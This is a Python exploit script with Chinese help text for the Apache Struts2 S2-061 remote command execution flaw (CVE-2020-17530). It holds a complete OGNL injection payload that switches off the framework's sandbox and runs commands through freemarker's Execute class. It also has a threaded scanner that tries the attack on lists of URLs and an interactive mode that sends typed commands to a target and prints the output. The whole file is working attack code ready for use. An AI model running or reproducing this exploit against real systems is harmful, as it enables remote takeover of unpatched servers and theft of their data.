import requests
import argparse
import threading
import sys
import re
from bs4 import BeautifulSoup


# 帮助
def cmd_line():
    parse = argparse.ArgumentParser(
        description="Struts2 S2-061 远程命令执行漏洞（CVE-2020-17530）",  # 描述
        usage='''
        python CVE-2020-17530.py -u url
        python CVE-2020-17530.py -f file.txt
        python CVE-2020-17530.py -f file.txt -o out_file.txt
        python CVE-2020-17530.py -f file.txt -p socks5://127.0.0.1:7890 
        python CVE-2020-17530.py -e url
        ''',  # 使用方法
        add_help=True)  # 开启帮助
    # 指定选项 -u --url 指定目标url地址
    parse.add_argument('-u', '--url', help="指定webshell地址")
    parse.add_argument('-f', '--file', help="指定文件")
    # 指定选项 -p --proxy 设置代理
    parse.add_argument('-p', '--proxy', help="设置代理，如socks5://127.0.0.1:7890")
    parse.add_argument('-o', '--output', help="将结果输出到文件")
    parse.add_argument('-e', '--exploit', help="漏洞利用")

    # 默认使用 -h 开启帮助信息
    if len(sys.argv) == 1:
        sys.argv.append('-h')
    return parse.parse_args()


def poc(url, proxy_server, output_file):
    try:
        # url = 'http://192.168.116.162:8080'
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF',
        }

        data = '------WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\nContent-Disposition: form-data; name="id"\r\n\r\n%{{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("{}")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}}\r\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF--\r\n'

        response = requests.post(url=url, proxies={
                                 "http": proxy_server, "https": proxy_server}, headers=headers, data=data.format('id'))
        html = response.text

        pattern = re.compile(r'<a id="(.*?)\n"')
        username = pattern.findall(html)[0]
        if "uid" in username:
            print("[+] 漏洞存在！[✅]url: {}".format(url))
            print(username)
            if output_file:
                with open(output_file, 'a', encoding='utf-8') as f:
                    f.write('{0}\n'.format(url))

        else:
            print("[!] 漏洞不存在！[!] url: {}".format(url))
    except:
        print("[!] URL连接失败！[!] url: {}".format(url))


def file(file, proxy_server, output_file):
    with open(file, 'r', encoding='utf-8') as f:
        urls = f.readlines()
    threads = []
    for url in urls:
        t = threading.Thread(target=poc, args=(
            url.strip(), proxy_server, output_file))
        threads.append(t)
        t.start()


def exp(url, proxy_server):
    # url = 'http://192.168.116.162:8080/.action'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF',
    }

    data = '------WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\nContent-Disposition: form-data; name="id"\r\n\r\n%{{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("{}")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}}\r\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF--\r\n'

    try:
        while True:
            shell = input(">")
            response = requests.post(
                url=url, proxies={"http": proxy_server, "https": proxy_server}, headers=headers, data=data.format(shell))
            html = response.text
            soup = BeautifulSoup(html, 'html.parser')
            links = soup.find_all('a', id=True)

            for link in links:
                print(link['id'].strip())
    except:
        print("连接失败")


if __name__ == "__main__":
    args = cmd_line()
    if args.exploit:
        exp(args.exploit, args.proxy)
    elif args.file:
        file(args.file, args.proxy, args.output)
    else:
        poc(args.url, args.proxy, args.output)
